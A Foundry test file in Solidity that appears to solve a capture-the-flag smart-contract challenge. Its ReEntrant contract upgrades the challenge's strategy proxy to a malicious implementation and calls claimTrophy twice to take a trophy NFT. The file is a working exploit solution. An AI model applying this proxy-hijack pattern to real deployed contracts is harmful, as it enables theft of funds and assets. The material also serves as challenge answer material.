// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

import {AnniversaryChallenge} from "../src/AnniversaryChallenge.sol";
import {SimpleStrategy} from "../src/SimpleStrategy.sol";
import {NftReceiver} from "./NftReceiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {MaliciousSimpleStrategy} from "./MaliciousSimpleStrategy.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// Rules:
// 1. Use Ethernet fork.
// 2. Use 20486120 block.
// 3. No deal() and vm.deal() allowed.
// 4. No setUp() amendmends allowed.
// 5. The exploit must be executed in single transaction.
// 6. Your task is to claim trophy and get Trophy NFT as player account.
contract AnniversaryChallengeTest is Test {
    address player;
    AnniversaryChallenge challenge;

    //Rules: No setUp changes are allowed.
    function setUp() public {
        player = vm.addr(42);
        vm.deal(player, 1 ether);

        address simpleStrategyImplementation = address(new SimpleStrategy());
        bytes memory data = abi.encodeCall(
            SimpleStrategy.initialize,
            address(challenge)
        );
        address proxy = address(
            new ERC1967Proxy(simpleStrategyImplementation, data)
        );
        SimpleStrategy simpleStrategy = SimpleStrategy(proxy);

        challenge = new AnniversaryChallenge(simpleStrategy);

        deal(simpleStrategy.usdcAddress(), address(challenge), 1e6);
    }

    function test_claimTrophy() public {
        vm.startPrank(player);
        new ReEntrant{value: 1 wei}(challenge, player);
        
        //No execution of exploit after this point.
        vm.stopPrank();

        
        assertEq(challenge.trophyNFT().ownerOf(1), player);
    }
}

contract ReEntrant {
    AnniversaryChallenge public challenge;
    IERC721 public trophyNFT;
    NftReceiver public nftReceiver;
    address public playerAddress;

    constructor(
        AnniversaryChallenge _challenge,
        address playerAddress_
    ) payable {
        challenge = _challenge;
        trophyNFT = challenge.trophyNFT();
        nftReceiver = new NftReceiver{value: 1 wei}(msg.sender);
        playerAddress = playerAddress_;

        _upgradeSimplyStorage();
        _executeCall();
    }

    function _upgradeSimplyStorage() private {
        MaliciousSimpleStrategy maliciousSimpleStrategy = new MaliciousSimpleStrategy();
        challenge.simpleStrategy().upgradeTo(address(maliciousSimpleStrategy));
    }

    function _executeCall() private {
        challenge.claimTrophy(address(nftReceiver), 1 wei);
        challenge.claimTrophy(address(nftReceiver), 1 wei);
    }
}
